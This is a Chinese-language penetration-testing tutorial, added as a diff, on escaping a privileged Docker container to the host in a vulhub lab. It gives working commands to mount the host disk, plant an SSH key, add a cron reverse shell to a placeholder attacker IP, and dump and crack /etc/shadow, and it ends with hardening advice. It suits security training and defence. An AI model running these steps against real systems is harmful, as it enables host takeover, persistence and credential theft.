@@ -1,0 +1,211 @@
+## 1. 概述
+
+在渗透测试和红队行动中，当初始立足点位于一个 Docker 容器内时，一个核心目标便是**容器逃逸 (Container Escape)** 并获取宿主机的控制权。本文档详细阐述了当容器以`--privileged`（特权模式）运行时，如何利用这一过高的权限配置，通过多种技术手段实现从容器内部到宿主机的权限提升。
+
+本文将深入探讨四种核心的提权技术：
+- **写入 SSH 密钥**：通过挂载宿主机磁盘，将攻击者的公钥写入宿主机的 `authorized_keys` 文件，从而实现免密登录。
+- **写入定时任务 (Cron Job)**：在宿主机的 Cron 配置文件中植入反向 Shell 命令，等待系统定时执行以获取 Shell。
+- **破解 Shadow 文件**：读取宿主机的 `/etc/shadow` 文件，利用 `hashcat` 等工具对用户密码哈希进行离线破解。
+- **利用内核漏洞 (CVE)**：在获得宿主机访问权限后，利用宿主机内核存在的特定 CVE 漏洞，执行代码以获得 root 权限。
+
+本文档旨在提供一份兼具理论深度与实战价值的技术指南，适用于安全研究人员、渗透测试工程师以及希望加固容器环境的系统管理员。
+
+## 2. 技术原理
+
+### 2.1 特权模式 (`--privileged`) 的风险
+
+Docker 的 `--privileged` 标志是一个极其危险的配置。它移除了容器与宿主机之间的几乎所有安全隔离层，具体表现为：
+
+- **完全的内核能力 (Capabilities)**：容器进程将获得宿主机上 `root` 用户所拥有的全部内核能力（Capabilities）。这意味着容器内的 `root` 用户与宿主机的 `root` 用户在权限上几乎没有区别。
+- **设备访问权限**：容器可以直接访问宿主机的所有设备文件，例如 `/dev/sda1`、`/dev/vda3` 等块设备。这为直接读写宿主机文件系统提供了可能。
+
+当容器以特权模式运行时，其内部的 `root` 用户实际上拥有了操作宿主机底层资源的能力。我们的攻击正是基于这一点展开的。
+
+### 2.2 提权向量分析
+
+- **磁盘挂载**：既然容器可以访问宿主机的块设备（如 `/dev/vda3`），我们就可以在容器内创建一个挂载点（例如 `/test`），然后将宿主机的根分区或其他关键分区挂载到这个目录。一旦挂载成功，容器内的进程就能像操作本地文件一样，任意读写宿主机的整个文件系统。
+- **持久化与执行**：成功挂载宿主机文件系统后，我们需要一种方法来执行代码或获取登录凭证。
+    - **SSH 密钥** 是一种持久化访问方式。通过修改 `/root/.ssh/authorized_keys`，我们为自己创建了一个合法的“后门”。
+    - **定时任务** 是一种命令执行方式。通过修改 `/var/spool/cron/` 目录下的文件，我们利用系统的 `cron` 服务在指定时间为我们执行任意命令（如反向 Shell）。
+    - **密码破解** 是一种凭证获取方式。通过读取 `/etc/shadow`，我们可以尝试离线破解用户的登录密码，从而获得直接登录系统的权限。
+
+## 3. 环境准备
+
+为了复现本文描述的攻击场景，我们使用 `vulhub` 中的 `tomcat/tomcat8` 靶场环境。
+
+1.  **克隆 Vulhub 仓库**
+    ```bash
+    git clone https://github.com/vulhub/vulhub.git
+    cd vulhub/tomcat/tomcat8
+    ```
+
+2.  **修改 `docker-compose.yml`**
+    为了模拟特权模式的错误配置，需要编辑 `docker-compose.yml` 文件，在 `tomcat1` 服务下添加 `privileged: true`。
+
+    ```yaml
+    version: '2'
+    services:
+     tomcat1:
+       image: vulhub/tomcat:8.5
+       container_name: vulhub_tomcat_8_5
+       privileged: true  # <-- 添加此行
+       ports:
+        - "8080:8080"
+    ```
+
+3.  **启动靶场环境**
+    ```bash
+    docker-compose up -d
+    ```
+
+4.  **获取容器 Shell**
+    首先，你需要通过 Tomcat 的某个漏洞（例如文件上传漏洞）获取一个 Web Shell，然后反弹一个交互式 Shell 到你的攻击机上。或者，为了专注于提权，可以直接进入容器：
+    ```bash
+    docker exec -it vulhub_tomcat_8_5 /bin/bash
+    ```
+
+## 4. 实战示例
+
+在进入容器后，我们首先需要进行信息收集，以确认当前环境和可用的攻击路径。
+
+### 4.1 环境探测
+
+1.  **检测是否在 Docker 环境中**
+    ```bash
+    cat /proc/1/cgroup | grep -qi docker && echo "In a Docker container" || echo "Not in a Docker container"
+    ```
+    该命令通过检查进程 1 的 cgroup 信息来判断是否运行在 Docker 内。
+
+2.  **判断是否为特权模式**
+    ```bash
+    cat /proc/self/status | grep CapEff
+    ```
+    在特权模式下，`CapEff` 的值通常是 `0000003fffffffff`，代表拥有所有内核能力。而在普通容器中，这个值会小得多。
+
+3.  **列出宿主机磁盘设备**
+    由于是特权模式，我们可以直接列出宿主机上的块设备。
+    ```bash
+    fdisk -l
+    ```
+    输出会显示宿主机的所有磁盘和分区，例如 `/dev/vda1`, `/dev/vda2`, `/dev/vda3` 等。我们需要根据分区大小和类型判断哪个是根分区（通常是 `Linux` 类型且容量较大）。在本例中，我们假设 `/dev/vda3` 是宿主机的根分区。
+
+### 4.2 攻击方法一：写入 SSH 密钥 (Ubuntu 宿主机复现)
+
+这是最直接、最稳定的提权方法。
+
+1.  **挂载宿主机根分区**
+    在容器内创建一个目录作为挂载点，并将宿主机的根分区挂载上去。
+    ```bash
+    mkdir /host_root
+    mount /dev/vda3 /host_root
+    ```
+
+2.  **验证挂载是否成功**
+    尝试列出宿主机 `/root` 目录的内容。
+    ```bash
+    ls /host_root/root
+    ```
+    如果能看到宿主机 `root` 用户家目录下的文件，说明挂载成功。
+
+3.  **在攻击机上生成 SSH 密钥对**
+    在你的本地攻击机（非容器内）执行以下命令生成一个新的密钥对。
+    ```bash
+    ssh-keygen -t rsa -b 4096 -f id_rsa_victim
+    ```
+    这会生成 `id_rsa_victim` (私钥) 和 `id_rsa_victim.pub` (公钥) 两个文件。
+
+4.  **将公钥写入宿主机**
+    首先，查看并复制公钥内容。
+    ```bash
+    cat id_rsa_victim.pub
+    ```
+    然后，在容器的 Shell 中，将复制的公钥字符串写入宿主机的 `authorized_keys` 文件。
+    ```bash
+    # 确保目标目录存在
+    mkdir -p /host_root/root/.ssh
+    # 将你的公钥内容粘贴到这里
+    echo 'ssh-rsa AAAA...' > /host_root/root/.ssh/authorized_keys
+    ```
+
+5.  **使用私钥登录宿主机**
+    回到你的攻击机，使用刚刚生成的私钥以 `root` 用户身份登录宿主机。
+    ```bash
+    ssh -i id_rsa_victim root@<宿主机_IP_地址>
+    ```
+    如果一切顺利，你将无需密码直接登录到宿主机的 root Shell。
+
+### 4.3 攻击方法二：写入定时任务 (CentOS 宿主机复现)
+
+如果 SSH 端口未开放或不允许密钥登录，可以尝试写入定时任务来反弹 Shell。
+
+1.  **挂载宿主机文件系统**
+    同上一步，先挂载宿主机根分区到 `/host_root`。
+
+2.  **构造反向 Shell 命令**
+    准备一个每分钟执行一次的反向 Shell 命令。你需要将 `xx.xx.xx.xx` 替换为你的攻击机 IP，`xxxx` 替换为监听端口。
+    ```bash
+    echo '* * * * * /bin/bash -i > /dev/tcp/xx.xx.xx.xx/xxxx 0>&1 2>&1' >> /host_root/var/spool/cron/root
+    ```
+
+3.  **在攻击机上设置监听**
+    在你的攻击机上使用 `netcat` 或 `socat` 监听指定端口。
+    ```bash
+    nc -lvnp xxxx
+    ```
+
+4.  **等待反弹 Shell**
+    等待最多一分钟，`cron` 服务就会执行你写入的命令，你的监听窗口将收到一个来自宿主机的 root Shell。
+
+### 4.4 攻击方法三：破解 Shadow 文件
+
+如果无法直接执行命令或写入文件，可以尝试获取密码哈希进行离线破解。
+
+1.  **挂载并读取 Shadow 文件**
+    ```bash
+    mkdir /host_root
+    mount /dev/vda3 /host_root
+    cat /host_root/etc/shadow
+    ```
+    将输出的内容（特别是 `root` 用户那一行）保存到本地文件中，例如 `shadow.txt`。
+
+2.  **使用 Hashcat 进行破解**
+    在你的攻击机上，使用 `hashcat` 和一个强大的字典文件来破解密码哈希。
+    - `-m 1800` 指定哈希类型为 `sha512crypt`，这是现代 Linux 系统常用的格式。
+    - `-a 0` 指定攻击模式为字典攻击。
+
+    ```bash
+    # 示例命令
+    hashcat -m 1800 -a 0 shadow.txt /path/to/rockyou.txt
+    ```
+    如果密码存在于字典中，`hashcat` 将会破解并显示它。
+
+## 5. 关键细节
+
+- **不同系统的 Cron 路径**：写入定时任务时，目标路径因 Linux 发行版而异，需要预先判断或依次尝试。
+    - **CentOS/RHEL**: `/var/spool/cron/root`
+    - **Ubuntu/Debian**: `/var/spool/cron/crontabs/root`
+    - **Alpine**: `/etc/cron.d/root` (文件名可自定义)
+    - **通用系统任务**: `/etc/crontab` (格式略有不同，需要指定用户)
+
+- **Hashcat 模式选择**：`/etc/shadow` 文件中的哈希格式可能不同。`$6$` 前缀代表 `sha512crypt` (模式 1800)，`$5$` 代表 `sha256crypt` (模式 7400)，`$1$` 代表 `md5crypt` (模式 500)。需要根据哈希前缀选择正确的 `hashcat` 模式。
+
+- **CVE 漏洞利用**：
+    - **前提**：此方法依赖于宿主机内核本身存在未修复的提权漏洞。
+    - **流程**：首先需要通过上述方法之一（如挂载磁盘）获得在宿主机上执行代码或写入文件的能力。然后，上传针对特定 CVE 的漏洞利用程序（Exploit），编译并执行它来获取 root Shell。
+    - **参考资料**：关于具体的内核漏洞利用，可以参考 [此篇文章](https://mp.weixin.qq.com/s/tk5Ya8DzoKQTgqkotr_dkQ) 中提到的 Dirty COW (CVE-2016-5195) 等经典案例。成功率取决于环境是否匹配。
+
+## 6. 安全总结与防御建议
+
+特权容器逃逸的根本原因在于授予了容器不必要的过高权限。缓解和防御此类攻击的核心在于遵循**最小权限原则**。
+
+- **禁止使用 `--privileged` 模式**：这是最重要的一条规则。除非有绝对必要且已评估所有风险，否则永远不要在生产环境中使用此标志。
+
+- **限制内核能力 (Capabilities)**：替代 `--privileged`，使用 `--cap-add` 和 `--cap-drop` 精确授予容器所需的最小内核能力集。默认情况下，Docker 会移除许多危险的 capabilities，例如 `SYS_ADMIN`。
+
+- **启用用户命名空间 (User Namespaces)**：通过将容器内的 `root` 用户映射到宿主机上的一个非特权用户，可以极大地限制容器进程在宿主机上的权限，即使发生逃逸，攻击者也只是一个普通用户。
+
+- **使用 AppArmor 和 Seccomp**：配置 AppArmor 和 Seccomp 安全策略，可以限制容器进程可以进行的系统调用，从而阻止挂载设备、修改关键文件等危险行为。
+
+- **保持宿主机内核更新**：及时为宿主机打上安全补丁，修复已知的内核提权漏洞，以防止在逃逸后被进一步利用。
+
+通过实施这些纵深防御措施，可以显著提高容器环境的安全性，有效防止因配置不当而导致的宿主机权限泄露。
